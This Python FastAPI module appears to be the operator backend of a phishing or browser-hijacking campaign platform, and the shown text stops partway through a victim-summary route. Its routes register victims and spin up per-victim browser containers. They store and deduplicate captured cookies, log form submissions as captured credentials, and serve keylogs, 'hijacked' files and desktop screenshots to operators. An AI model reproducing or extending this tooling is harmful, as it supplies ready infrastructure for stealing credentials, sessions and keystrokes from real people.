"""Victim records, collected data, artifacts, and overview routes."""

from __future__ import annotations

from utils.cookie_capture import filter_new_cookie_payload

from .campaign_common import (
    APIRouter,
    Campaign,
    CampaignStatus,
    CollectedInfoRequest,
    DataCollection,
    DataCollectionRequest,
    Depends,
    EventCreateRequest,
    EventType,
    FileResponse,
    GlobalCapacityError,
    HTTPException,
    Module,
    Optional,
    Path,
    Query,
    RuntimeStartupError,
    STORAGE_PATH,
    Session,
    User,
    Victim,
    VictimContainerRequest,
    VictimCreateRequest,
    VictimEvent,
    VictimStatus,
    VictimStatusRequest,
    _apply_interactive_client_metadata,
    _merge_collected_metadata,
    _serialize_screenshot,
    asyncio,
    base64,
    capture_admin_owned_victim_screenshot,
    configured_upload_limit,
    create_admin_owned_victim_container,
    datetime,
    destroy_admin_owned_victim_container,
    docker,
    dump_admin_owned_victim_container,
    func,
    get_db,
    logger,
    normalize_artifact_path,
    os,
    read_file_tail_bounded,
    require_campaign_read_access,
    require_campaign_write_access,
    resolve_artifact_file,
    safe_campaign_directory_name,
    secrets,
    setup_campaign_storage,
    status,
    timedelta,
    timezone,
    uuid,
    verify_campaign_internal_key,
    verify_internal_key_or_campaign_reader,
)

router = APIRouter()


@router.post("/{campaign_id}/internal/victims/{victim_id}/container")
async def create_internal_victim_container(
    campaign_id: str,
    victim_id: str,
    data: VictimContainerRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key),
):
    """Create a victim container without exposing Docker to campaign services."""
    campaign = db.query(Campaign).filter(
        Campaign.id == campaign_id,
        Campaign.deleted_at == None,
        Campaign.status == CampaignStatus.active,
    ).first()
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id,
    ).first()
    if not campaign or not victim:
        raise HTTPException(404, "Campaign or victim not available")

    user_agent = data.user_agent
    theme = data.theme

    try:
        return await asyncio.to_thread(
            create_admin_owned_victim_container,
            campaign,
            victim_id,
            user_agent,
            theme,
        )
    except RuntimeStartupError as exc:
        logger.error(
            "Victim runtime startup failed",
            extra={
                "campaign_id": campaign_id,
                "victim_id": victim_id,
                "error_code": exc.diagnostic.error_code,
                "exit_code": exc.diagnostic.exit_code,
            },
        )
        raise HTTPException(
            status_code=503,
            detail={
                "code": exc.diagnostic.error_code,
                "message": "Victim browser failed to start",
                "exit_code": exc.diagnostic.exit_code,
            },
        ) from exc
    except GlobalCapacityError as exc:
        logger.warning(
            "Rejected victim container creation for %s: %s", victim_id, exc
        )
        raise HTTPException(
            status_code=503,
            detail="Too many active victim sessions; try again shortly",
        ) from exc
    except Exception as exc:
        logger.exception("Failed to create victim container %s", victim_id)
        raise HTTPException(500, "Victim container creation failed") from exc


@router.post("/{campaign_id}/internal/victims/{victim_id}/container/dump")
async def dump_internal_victim_container(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key),
):
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id,
    ).first()
    if not campaign or not victim:
        raise HTTPException(404, "Campaign or victim not found")
    try:
        await dump_admin_owned_victim_container(campaign, victim_id)
    except docker.errors.NotFound as exc:
        raise HTTPException(404, "Victim container not found") from exc
    except Exception as exc:
        logger.exception("Failed to dump victim container %s", victim_id)
        raise HTTPException(500, "Victim container dump failed") from exc
    return {"success": True}


@router.delete("/{campaign_id}/internal/victims/{victim_id}/container")
async def delete_internal_victim_container(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key),
):
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id,
    ).first()
    if not campaign or not victim:
        raise HTTPException(404, "Campaign or victim not found")
    try:
        await asyncio.to_thread(
            destroy_admin_owned_victim_container,
            campaign,
            victim_id,
        )
    except Exception as exc:
        logger.exception("Failed to delete victim container %s", victim_id)
        raise HTTPException(500, "Victim container deletion failed") from exc
    return {"success": True}


@router.get("/{campaign_id}/victims")
async def list_victims(
    campaign_id: str,
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """List victims with pagination"""

    # ✅ ACL
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    # Get victims with pagination
    total = db.query(Victim).filter(Victim.campaign_id == campaign_id).count()

    victims = db.query(Victim).filter(
        Victim.campaign_id == campaign_id
    ).offset(skip).limit(limit).all()

    return {
        "victims": [v.to_dict() for v in victims],
        "total": total,
        "skip": skip,
        "limit": limit
    }


@router.get("/{campaign_id}/victims/tracking/{tracking_id}")
async def get_victim_by_tracking_id(
    campaign_id: str,
    tracking_id: str,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """Get victim by tracking ID (internal API for tracking)"""
    campaign = db.query(Campaign).filter(
        Campaign.id == campaign_id,
        Campaign.deleted_at == None,
        Campaign.status == CampaignStatus.active,
    ).first()
    if not campaign:
        raise HTTPException(404, "Campaign not available")

    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.tracking_id == tracking_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    return victim.to_dict()


@router.get("/{campaign_id}/victims/{victim_id}")
async def get_victim(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    _: object = Depends(verify_internal_key_or_campaign_reader)
):
    """Get single victim details"""
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    return victim.to_dict(include_events=True)


@router.post("/{campaign_id}/victims")
async def add_victim(
    campaign_id: str,
    victim_data: VictimCreateRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """Add a new victim to a campaign (internal API)"""
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    victim_id = victim_data.id or victim_data.victim_id or str(uuid.uuid4())
    session_id = victim_data.session_id or victim_id

    # Check if victim already exists
    existing = db.query(Victim).filter_by(id=victim_id, campaign_id=campaign_id).first()
    if existing:
        return {"success": True, "victim_id": existing.id, "existing": True}

    victim = Victim(
        id=victim_id,
        campaign_id=campaign_id,
        session_id=session_id,
        ip_address=victim_data.ip_address,
        user_agent=victim_data.user_agent,
        is_active=False
    )

    db.add(victim)
    db.commit()
    db.refresh(victim)

    logger.info(f"✅ Created victim via internal API: {victim.id}")
    return {"success": True, "victim_id": victim.id, "existing": False}


@router.patch("/{campaign_id}/victims/{victim_id}/status")
async def update_victim_status(
    campaign_id: str,
    victim_id: str,
    data: VictimStatusRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """Update victim status (connected/disconnected)"""
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # A delayed heartbeat must not bring a session back online after the
    # campaign has been paused or manually completed.
    victim.is_active = (
        data.status == "active"
        and victim.campaign is not None
        and victim.campaign.status == CampaignStatus.active
    )
    if victim.first_seen is None:
        victim.first_seen = datetime.now(timezone.utc)
    victim.last_seen = datetime.now(timezone.utc)

    db.commit()

    logger.info(f"🔄 Updated status for victim {victim_id}: {data.status}")
    return {"success": True, "victim_id": victim.id, "is_active": victim.is_active}


@router.patch("/{campaign_id}/victims/{victim_id}/collected_info")
async def update_victim_collected_info(
    campaign_id: str,
    victim_id: str,
    collected_info: CollectedInfoRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """Update victim collected browser info"""
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    _merge_collected_metadata(victim, collected_info.root)
    db.commit()

    logger.info(f"📊 Updated collected info for victim {victim_id}")
    return {"success": True, "victim_id": victim.id}


@router.get("/{campaign_id}/victims/{victim_id}/collected_info")
async def get_victim_collected_info(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get collected browser info for a victim"""
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    if not victim.extra_metadata:
        return {"victim_id": victim_id, "collected_info": {}}

    return {
        "victim_id": victim_id,
        "collected_info": victim.extra_metadata,
    }


@router.get("/{campaign_id}/victims/{victim_id}/events")
async def get_victim_events(
    campaign_id: str,
    victim_id: str,
    type: Optional[str] = Query(None, description="Filter by event type"),
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get victim activity (unified endpoint for all event types)"""

    # ✅ ACL
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Build query
    query = db.query(VictimEvent).filter(
        VictimEvent.victim_id == victim_id,
        VictimEvent.campaign_id == campaign_id
    )

    # Filter by type
    if type and type != 'all':
        query = query.filter(VictimEvent.event_type == type)

    total = query.count()

    # Get events with pagination
    events = query.order_by(
        VictimEvent.timestamp.desc()
    ).offset(skip).limit(limit).all()

    return {
        "events": [e.to_dict() for e in events],
        "total": total,
        "skip": skip,
        "limit": limit
    }


@router.post("/{campaign_id}/victims/{victim_id}/events")
async def create_event(
    campaign_id: str,
    victim_id: str,
    data: EventCreateRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """Create victim event (unified endpoint - called by campaign container)"""

    # 1. Verify victim exists
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    event_type = data.event_type
    event_type_str = event_type.value
    event_payload = data.payload
    timestamp = data.timestamp or datetime.now(timezone.utc)

    if event_type == EventType.COOKIE_CAPTURED:
        event_payload, duplicate_count = filter_new_cookie_payload(
            db,
            victim_id,
            event_payload,
        )
        if event_payload is None:
            victim.last_seen = datetime.now(timezone.utc)
            db.commit()
            logger.debug(
                "Skipped %s duplicate cookie(s) for victim=%s",
                duplicate_count,
                victim_id,
            )
            return {
                "success": True,
                "duplicate": True,
                "event_id": None,
                "event_type": event_type_str,
                "timestamp": timestamp.isoformat(),
            }

    # 4. Extract fields
    url = data.url
    hostname = data.hostname
    title = data.title or event_type_str.replace('_', ' ').title()
    description = data.description or ""

    # 5. Create event
    event = VictimEvent(
        id=str(uuid.uuid4()),
        campaign_id=campaign_id,
        victim_id=victim_id,
        event_type=event_type,
        timestamp=timestamp,
        url=url,
        hostname=hostname,
        title=title,
        description=description,
        payload=event_payload,
    )

    db.add(event)

    # 6. Update victim last_seen
    victim.last_seen = datetime.now(timezone.utc)
    _apply_interactive_client_metadata(victim, event_type, event_payload)

    if event_type in [EventType.COOKIE_CAPTURED, EventType.FORM_SUBMISSION, EventType.FILE_DOWNLOADED, EventType.FILE_UPLOADED]:
        victim.status = VictimStatus.data_submitted

    db.commit()
    db.refresh(event)

    logger.info(f"📊 Event created: {event_type_str}, victim={victim_id}")

    return {
        "success": True,
        "event_id": event.id,
        "event_type": event_type_str,
        "timestamp": event.timestamp.isoformat()
    }


@router.post("/{campaign_id}/victims/{victim_id}/data")
async def add_victim_data(
    campaign_id: str,
    victim_id: str,
    data: DataCollectionRequest,
    db: Session = Depends(get_db),
    _: bool = Depends(verify_campaign_internal_key)
):
    """
    Add a data collection record for a victim.
    Called by campaign container when it saves a file (screenshot, hijacked file, etc.).

    Payload:
    {
        "data_type": "screenshot|file_hijacked|download|cookie",
        "file_path": "screenshots/2026-02-10_00-15-23.png",  // Relative path
        "file_size_bytes": 245678,
        "collected_at": "2026-02-10T00:15:23Z",  // optional
        "extra_metadata": {
            "original_url": "https://...",
            "mime_type": "image/png"
        }
    }
    """

    # Verify victim exists
    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # File callbacks are retryable. Reuse the record if the gateway repeats a
    # callback after losing the original response.
    data_collection = None
    if data.file_path is not None:
        data_collection = db.query(DataCollection).filter(
            DataCollection.campaign_id == campaign_id,
            DataCollection.victim_id == victim_id,
            DataCollection.data_type == data.data_type,
            DataCollection.file_path == data.file_path,
        ).first()

    if data_collection is None:
        data_collection = DataCollection(
            victim_id=victim_id,
            campaign_id=campaign_id,
            module_id=data.module_id,
            data_type=data.data_type,
            file_path=data.file_path,
        )
        db.add(data_collection)

    data_collection.file_size_bytes = data.file_size_bytes
    data_collection.collected_at = (
        data.collected_at or datetime.now(timezone.utc)
    )
    data_collection.extra_metadata = data.extra_metadata

    if data_collection.data_type == "screenshot":
        db.flush()
        victim.campaign.total_screenshots = db.query(DataCollection).filter(
            DataCollection.campaign_id == campaign_id,
            DataCollection.data_type == "screenshot",
        ).count()

    db.commit()
    db.refresh(data_collection)

    logger.info(f"💾 Saved {data_collection.data_type} for victim {victim_id}: {data_collection.file_path}")

    return {"success": True, "id": data_collection.id}


@router.get("/{campaign_id}/victims/{victim_id}/data")
async def get_victim_data(
    campaign_id: str,
    victim_id: str,
    data_type: Optional[str] = Query(None, description="Filter by data type"),
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    _: object = Depends(verify_internal_key_or_campaign_reader)
):
    """Get data collections for a victim (generic endpoint)"""

    # Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # Build query
    query = db.query(DataCollection).filter(
        DataCollection.campaign_id == campaign_id,
        DataCollection.victim_id == victim_id
    )

    # Filter by type if specified
    if data_type:
        query = query.filter(DataCollection.data_type == data_type)

    total = query.count()

    data = query.order_by(
        DataCollection.collected_at.desc()
    ).offset(skip).limit(limit).all()

    return {
        "total": total,
        "data": [d.to_dict() for d in data],
        "skip": skip,
        "limit": limit
    }


@router.get("/{campaign_id}/victims/{victim_id}/modules-data")
async def get_victim_modules_data(
    campaign_id: str,
    victim_id: str,
    module_id: Optional[str] = Query(None, description="Filter by specific module"),
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get module execution outputs for a victim"""

    # ✅ ACL - Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # Build query for module_data type
    query = db.query(DataCollection).filter(
        DataCollection.campaign_id == campaign_id,
        DataCollection.victim_id == victim_id,
        DataCollection.data_type == "module_data"
    )

    # Filter by specific module if requested
    if module_id:
        query = query.filter(DataCollection.module_id == module_id)

    total = query.count()

    # Get data with pagination
    data = query.order_by(
        DataCollection.collected_at.desc()
    ).offset(skip).limit(limit).all()

    # Group by module_id for overview
    module_groups = {}
    for d in data:
        mid = d.module_id
        if mid not in module_groups:
            # Get module info
            module = db.query(Module).filter(Module.id == mid).first()
            module_groups[mid] = {
                "module_id": mid,
                "module_name": module.name if module else "Unknown",
                "module_category": module.category if module else "Unknown",
                "execution_count": 0,
                "executions": []
            }

        module_groups[mid]["execution_count"] += 1
        module_groups[mid]["executions"].append(d.to_dict())

    return {
        "total": total,
        "modules": list(module_groups.values()),
        "skip": skip,
        "limit": limit
    }


@router.post("/{campaign_id}/victims/{victim_id}/screenshots")
async def capture_screenshot(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_write_access),
):
    """Capture and persist the current victim desktop on operator request."""
    campaign = db.query(Campaign).filter(
        Campaign.id == campaign_id,
        Campaign.deleted_at == None,
    ).first()
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id,
    ).first()
    if not campaign or not victim:
        raise HTTPException(404, "Campaign or victim not found")
    if not victim.is_active:
        raise HTTPException(409, "Victim browser is not connected")

    try:
        captured = await asyncio.to_thread(
            capture_admin_owned_victim_screenshot,
            campaign,
            victim_id,
        )
    except docker.errors.NotFound as exc:
        raise HTTPException(409, "Victim browser container is not available") from exc
    except Exception as exc:
        logger.exception(
            "Screenshot capture failed for campaign %s victim %s",
            campaign_id,
            victim_id,
        )
        raise HTTPException(502, "Victim screenshot capture failed") from exc

    victim_root = (
        setup_campaign_storage(campaign.name, campaign.id)
        / victim_id
    )
    screenshot_directory = victim_root / "screenshots"
    if screenshot_directory.exists() and (
        screenshot_directory.is_symlink()
        or not screenshot_directory.is_dir()
    ):
        raise HTTPException(500, "Invalid screenshot storage")
    screenshot_directory.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now(timezone.utc)
    filename = (
        f"screenshot_{timestamp.strftime('%Y%m%d_%H%M%S_%f')}_"
        f"{secrets.token_hex(4)}.png"
    )
    destination = screenshot_directory / filename
    relative_path = f"screenshots/{filename}"

    try:
        file_descriptor = os.open(
            destination,
            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
            0o600,
        )
        with os.fdopen(file_descriptor, "wb") as output:
            output.write(captured.content)

        screenshot = DataCollection(
            victim_id=victim_id,
            campaign_id=campaign_id,
            data_type="screenshot",
            file_path=relative_path,
            file_size_bytes=len(captured.content),
            collected_at=timestamp,
            extra_metadata={
                "capture_mode": "manual",
                "resolution": f"{captured.width}x{captured.height}",
            },
        )
        db.add(screenshot)
        db.flush()
        db.add(
            VictimEvent(
                campaign_id=campaign_id,
                victim_id=victim_id,
                event_type=EventType.SCREENSHOT,
                timestamp=timestamp,
                title="Screenshot captured",
                description="Captured manually from the admin dashboard",
                payload={"screenshot_id": screenshot.id},
            )
        )
        campaign.total_screenshots = db.query(DataCollection).filter(
            DataCollection.campaign_id == campaign_id,
            DataCollection.data_type == "screenshot",
        ).count()
        db.commit()
        db.refresh(screenshot)
    except Exception:
        db.rollback()
        destination.unlink(missing_ok=True)
        logger.exception(
            "Failed to persist screenshot for campaign %s victim %s",
            campaign_id,
            victim_id,
        )
        raise HTTPException(500, "Failed to persist screenshot")

    logger.info(
        "Screenshot captured for victim %s in campaign %s (by %s)",
        victim_id,
        campaign_id,
        current_user.username,
    )

    return {
        "success": True,
        "screenshot": _serialize_screenshot(
            screenshot,
            campaign_id,
            victim_id,
        ),
    }


@router.get("/{campaign_id}/victims/{victim_id}/screenshots")
async def list_screenshots(
    campaign_id: str,
    victim_id: str,
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """List manually captured screenshots with bounded pagination."""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Query DB (not filesystem!)
    query = db.query(DataCollection).filter(
        DataCollection.campaign_id == campaign_id,
        DataCollection.victim_id == victim_id,
        DataCollection.data_type == "screenshot"
    ).order_by(DataCollection.collected_at.desc())

    total = query.count()
    screenshots = query.offset(skip).limit(limit).all()

    logger.info(f"📸 Found {total} screenshots for victim {victim_id}")

    return {
        "total": total,
        "screenshots": [
            _serialize_screenshot(screenshot, campaign_id, victim_id)
            for screenshot in screenshots
        ],
        "skip": skip,
        "limit": limit
    }


@router.get("/{campaign_id}/victims/{victim_id}/files_hijacked")
async def list_file_hijacked(
    campaign_id: str,
    victim_id: str,
    skip: int = Query(0, ge=0, le=1_000_000),
    limit: int = Query(100, ge=1, le=500),
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """List file hijacked artifacts for a victim (from DB)"""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Query DB
    query = db.query(DataCollection).filter(
        DataCollection.campaign_id == campaign_id,
        DataCollection.victim_id == victim_id,
        DataCollection.data_type == "file_hijacked"
    ).order_by(DataCollection.collected_at.desc())

    total = query.count()
    files = query.offset(skip).limit(limit).all()

    logger.info(f"📁 Found {total} hijacked files for victim {victim_id}")

    return {
        "total": total,
        "files": [
            {
                "id": f.id,
                "name": os.path.basename(f.file_path),
                "file_path": f.file_path,
                "size_bytes": f.file_size_bytes or 0,
                "size_mb": round(f.file_size_bytes / (1024 * 1024), 2) if f.file_size_bytes else 0,
                "collected_at": f.collected_at,
                "download_url": f"/api/campaigns/{campaign_id}/victims/{victim_id}/files/{f.file_path}"
            }
            for f in files
        ],
        "skip": skip,
        "limit": limit
    }


@router.get("/{campaign_id}/victims/{victim_id}/keylogs")
async def get_keylogs(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """
    Get keylogs for victim (read directly from filesystem for simplicity).
    Keylogs are continuously appended to a single file, so DB tracking isn't practical.
    """

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id,
    ).first()
    if not victim:
        raise HTTPException(404, "Victim not found")

    campaign_dir = (
        Path(STORAGE_PATH)
        / "campaigns"
        / safe_campaign_directory_name(campaign.name, campaign.id)
    )
    try:
        keylog_file = resolve_artifact_file(
            campaign_dir / victim_id,
            "keylogs.txt",
        )
    except ValueError:
        return {"victim_id": victim_id, "keylogs": "", "size": 0}

    keylog_limit = configured_upload_limit(
        "MAX_KEYLOG_RESPONSE_BYTES",
        5 * 1024 * 1024,
    )
    try:
        keylog_bytes, original_size = read_file_tail_bounded(
            keylog_file,
            keylog_limit,
        )
    except (OSError, ValueError) as exc:
        logger.warning("Unable to read keylogs for victim %s: %s", victim_id, exc)
        raise HTTPException(404, "Keylog file not found") from exc

    # A byte-bounded tail can begin halfway through a multi-byte UTF-8
    # character. Drop continuation bytes so the browser always receives a
    # valid starting boundary.
    while keylog_bytes and keylog_bytes[0] & 0xC0 == 0x80:
        keylog_bytes = keylog_bytes[1:]

    # Base64 encode for safe transport
    keylogs_b64 = base64.b64encode(keylog_bytes).decode("ascii")

    return {
        "victim_id": victim_id,
        "keylogs": keylogs_b64,
        "size": len(keylog_bytes),
        "original_size": original_size,
        "truncated": original_size > len(keylog_bytes),
    }


@router.get("/{campaign_id}/victims/{victim_id}/files/{file_path:path}")
async def serve_victim_file(
    campaign_id: str,
    victim_id: str,
    file_path: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Serve victim file (screenshot, hijacked file, etc.)"""

    # ✅ Verify ownership
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(403, "Not your campaign")

    # ✅ Verify victim exists
    victim = db.query(Victim).filter(
        Victim.id == victim_id,
        Victim.campaign_id == campaign_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    try:
        normalized_path = normalize_artifact_path(file_path)
    except ValueError as exc:
        raise HTTPException(400, str(exc)) from exc

    artifact = db.query(DataCollection).filter(
        DataCollection.campaign_id == campaign_id,
        DataCollection.victim_id == victim_id,
        DataCollection.file_path == normalized_path,
    ).first()
    if not artifact:
        raise HTTPException(404, "Artifact not found")

    # ✅ Build safe path
    campaign_dir = (
        Path(STORAGE_PATH)
        / "campaigns"
        / safe_campaign_directory_name(campaign.name, campaign.id)
    )
    try:
        safe_path = resolve_artifact_file(
            campaign_dir / victim_id,
            normalized_path,
        )
    except ValueError as exc:
        raise HTTPException(404, "Artifact file not found") from exc

    logger.info(f"📥 Serving file: {safe_path}")

    if not safe_path.exists():
        raise HTTPException(404, "File not found")

    return FileResponse(safe_path)


@router.get("/{campaign_id}/overview")
async def get_campaign_overview(
    campaign_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get campaign overview with all stats"""

    # ✅ ACL
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    # Update stats
    campaign.update_stats(db)

    # ✅ Victim counts
    total_victims = db.query(Victim).filter(
        Victim.campaign_id == campaign_id
    ).count()

    active_victims = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.last_seen >= datetime.now(timezone.utc) - timedelta(minutes=5)
    ).count()

    # ✅ Event stats (distinct victims)
    email_opened = db.query(func.count(func.distinct(VictimEvent.victim_id))).filter(
        VictimEvent.campaign_id == campaign_id,
        VictimEvent.event_type == EventType.EMAIL_OPENED
    ).scalar() or 0

    link_clicked = db.query(func.count(func.distinct(VictimEvent.victim_id))).filter(
        VictimEvent.campaign_id == campaign_id,
        VictimEvent.event_type == EventType.EMAIL_LINK_CLICKED
    ).scalar() or 0

    credentials_captured = db.query(func.count(func.distinct(VictimEvent.victim_id))).filter(
        VictimEvent.campaign_id == campaign_id,
        VictimEvent.event_type == EventType.FORM_SUBMISSION
    ).scalar() or 0

    # ✅ Total events
    total_events = db.query(VictimEvent).filter(
        VictimEvent.campaign_id == campaign_id
    ).count()

    # ✅ Recent activity (last 24h)
    last_24h = datetime.now(timezone.utc) - timedelta(hours=24)
    recent_events = db.query(VictimEvent).filter(
        VictimEvent.campaign_id == campaign_id,
        VictimEvent.timestamp >= last_24h
    ).count()

    # ✅ Latest events (last 10)
    latest = db.query(VictimEvent).filter(
        VictimEvent.campaign_id == campaign_id
    ).order_by(VictimEvent.timestamp.desc()).limit(10).all()

    return {
        "campaign": campaign.to_dict(include_stats=True),
        "victims": {
            "total": total_victims,
            "active": active_victims,
            "email_opened": email_opened,
            "email_link_clicked": link_clicked,
            "credentials_captured": credentials_captured
        },
        "activity": {
            "total_events": total_events,
            "recent_24h": recent_events
        },
        "latest_events": [e.to_dict() for e in latest]
    }


@router.get("/{campaign_id}/victims/{victim_id}/summary")
async def get_victim_summary(
    campaign_id: str,
    victim_id: str,
    db: Session = Depends(get_db),
    current_user: User = Depends(require_campaign_read_access)
):
    """Get victim summary with stats and latest activity"""

    # ✅ ACL
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()

    if not campaign:
        raise HTTPException(404, "Campaign not found")

    victim = db.query(Victim).filter(
        Victim.campaign_id == campaign_id,
        Victim.id == victim_id
    ).first()

    if not victim:
        raise HTTPException(404, "Victim not found")

    # ✅ Event counts
    event_counts = dict(
        db.query(
            VictimEvent.event_type,
            func.count(VictimEvent.id)
        ).filter(
            VictimEvent.victim_id == victim_id,
            VictimEvent.campaign_id == campaign_id
        ).group_by(VictimEvent.event_type).all()
    )

    # ✅ Data collection counts
    data_counts = dict(
        db.query(
            DataCollection.data_type,
            func.count(DataCollection.id)
        ).filter(
            DataCollection.victim_id == victim_id,
            DataCollection.campaign_id == campaign_id
        ).group_by(DataCollection.data_type).all()
    )

    # ✅ Time calculations
    first_event = db.query(VictimEvent).filter(
        VictimEvent.victim_id == victim_id
    ).order_by(VictimEvent.timestamp.asc()).first()

    last_event = db.query(VictimEvent).filter(
        VictimEvent.victim_id == victim_id
    ).order_by(VictimEvent.timestamp.desc()).first()

    active_time = "0m"
    if first_event and last_event:
        first_ts = first_event.timestamp if isinstance(first_event.timestamp, datetime) else datetime.fromisoformat(first_event.timestamp.replace('Z', '+00:00'))
        last_ts = last_event.timestamp if isinstance(last_event.timestamp, datetime) else datetime.fromisoformat(last_event.timestamp.replace('Z', '+00:00'))

        delta = last_ts - first_ts
        total_seconds = delta.total_seconds()

        if total_seconds < 60:
            active_time = "< 1m"
        else:
            hours = int(total_seconds // 3600)
            minutes = int((total_seconds % 3600) // 60)
            if hours > 0:
                active_time = f"{hours}h {minutes}m"
            else:
                active_time = f"{minutes}m"

    # ✅ Status
    status = "inactive"
    if victim.last_seen:
        try:
            if isinstance(victim.last_seen, str):
                last_seen_dt = datetime.fromisoformat(victim.last_seen.replace('Z', '+00:00'))
            else:
                last_seen_dt = victim.last_seen

            time_diff = datetime.now(timezone.utc) - last_seen_dt
            if time_diff.total_seconds() < 300:
                status = "active"
            elif time_diff.total_seconds() < 3600:
                status = "recent"
        except (ValueError, TypeError, OverflowError) as exc:
            # last_seen is written by our own code; a value it can't parse
            # points at a real data problem, not routine user input.
            logger.warning(
                "Could not compute status from last_seen for victim %s: %s",
                victim_id,
                exc,
            )
            status = "unknown"

    return {
        "victim": victim.to_dict(),
        "status": status,
        "stats": {
            "total_events": sum(event_counts.values()),
            "form_submissions": event_counts.get(EventType.FORM_SUBMISSION.value, 0),
            "navigation_events": event_counts.get(EventType.NAVIGATION.value, 0),
            "cookies_captured": event_counts.get(EventType.COOKIE_CAPTURED.value, 0),
            "screenshots": data_counts.get("screenshot", 0),
            "files_hijacked": data_counts.get("file_hijacked", 0),
